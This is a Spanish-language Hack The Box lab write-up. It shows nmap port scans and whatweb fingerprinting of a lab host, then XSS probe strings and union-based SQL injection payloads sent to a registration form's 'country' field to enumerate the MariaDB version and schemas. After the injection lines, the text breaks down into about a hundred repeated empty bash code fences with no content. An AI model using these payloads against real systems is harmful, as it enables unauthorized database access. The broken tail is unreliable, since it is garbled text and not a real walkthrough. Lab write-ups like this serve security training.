Ejecutamos nmap para scanear todos los puertos y guardarlo en un archivo allPorts

```bash
┌─[root@htb-7rejfbvatd]─[/home/outlanderlat]
└──╼ #nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.95.235 -oG
allPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-28 16:15 CDT
Initiating SYN Stealth Scan at 16:15
Scanning 10.129.95.235 [65535 ports]
Discovered open port 22/tcp on 10.129.95.235
Discovered open port 80/tcp on 10.129.95.235
Discovered open port 8080/tcp on 10.129.95.235
Discovered open port 4566/tcp on 10.129.95.235
Completed SYN Stealth Scan at 16:15, 13.17s elapsed (65535 total ports)
Nmap scan report for 10.129.95.235
Host is up, received user-set (0.065s latency).
Scanned at 2024-06-28 16:15:06 CDT for 13s
Not shown: 65522 closed tcp ports (reset), 9 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
80/tcp   open  http       syn-ack ttl 62
4566/tcp open  kwtc       syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.25 seconds
           Raw packets sent: 65544 (2.884MB) | Rcvd: 65591 (2.624MB)
```
Analizamos mas el puerto 80

```bash
┌─[root@htb-7rejfbvatd]─[/home/outlanderlat]
└──╼ #nmap -sCV -p22,80,4566,8080 10.129.95.235 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-28 16:18 CDT
Nmap scan report for 10.129.95.235
Host is up (0.065s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
80/tcp   open  http    Apache httpd 2.4.48 ((Debian))
|_http-server-header: Apache/2.4.48 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
4566/tcp open  http    nginx
|_http-title: 403 Forbidden
8080/tcp open  http    nginx
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.82 seconds
```
Lanzamos whatweb para determinar las tecnologias que se usan
```bash
┌─[root@htb-7rejfbvatd]─[/home/outlanderlat]
└──╼ #whatweb http://10.129.95.235
http://10.129.95.235 [200 OK] Apache[2.4.48], Bootstrap, Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.48 (Debian)], IP[10.129.95.235], JQuery, PHP[7.4.23], Script, X-Powered-By[PHP/7.4.23]
┌─[root@htb-7rejfbvatd]─[/home/outlanderlat]
└──╼ #whatweb http://10.129.95.235:8080
http://10.129.95.235:8080 [502 Bad Gateway] Country[RESERVED][ZZ], HTTPServer[nginx], IP[10.129.95.235], Title[502 Bad Gateway], nginx
```
Nos dirigimos al navegador...! en el dormulario e insertamos los siguites textos y vemos que se puede inyectar
```javascript
sk4res, <h1>hola</h1>, <script>alert("XSS")</script>, admin'

```
Vamos a abrir burbsuite, inerceptamos el trafico y alteramos el campo country, observamos que 
la base de datos es Registration y 
la version es 10.5.11-MariaDB-1
las otras bases de datos son information_schema, performance_schema, mysql, registration

```bash
burbsuite &> /dev/null/ &
username=admin&country=Brazil' union select database()-- -
username=admin&country=Brazil' union select version()-- -
username=admin&country=Brazil' union select schema_name from information_schema.schemata-- -
```
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash






